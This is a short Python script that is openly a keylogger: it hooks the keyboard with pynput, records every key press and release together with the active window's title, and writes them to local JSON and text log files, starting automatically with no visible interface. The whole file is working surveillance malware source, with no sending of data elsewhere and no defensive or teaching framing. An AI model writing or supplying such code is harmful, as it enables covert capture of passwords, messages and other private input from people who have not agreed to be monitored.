import json
import os
import time
import psutil
import pygetwindow as gw
from pynput import keyboard

keys_used = []
keys = ""
key_log_filename = 'key_log.json'
text_log_filename = 'key_log.txt'

def generate_text_log(entry):
    """Append logs to a text file."""
    with open(text_log_filename, "a") as text_log:
        text_log.write(entry + '\n')

def generate_json_file(keys_used):
    """Write logs to a JSON file."""
    with open(key_log_filename, 'w') as key_log:
        json.dump(keys_used, key_log, indent=4)

def get_active_window_title():
    """Get the title of the active window."""
    active_window = gw.getActiveWindow()
    return active_window.title if active_window else "Unknown"

def on_press(key):
    """Handle key press events."""
    global keys_used
    current_window = get_active_window_title()
    keys_used.append({'Pressed': str(key), 'Window': current_window})
    generate_json_file(keys_used)

def on_release(key):
    """Handle key release events."""
    global keys_used, keys
    current_window = get_active_window_title()
    keys_used.append({'Released': str(key), 'Window': current_window})
    generate_json_file(keys_used)
    keys += str(key)
    generate_text_log(f"Window: {current_window}, Key: {str(key)}")

def start_keylogger():
    """Start the keylogger."""
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join()  # This will keep the script running

# Ensure the log files exist
if not os.path.exists(key_log_filename):
    with open(key_log_filename, 'w') as file:
        json.dump([], file)
if not os.path.exists(text_log_filename):
    with open(text_log_filename, 'w') as file:
        file.write("")

# Start the keylogger automatically without GUI
start_keylogger()
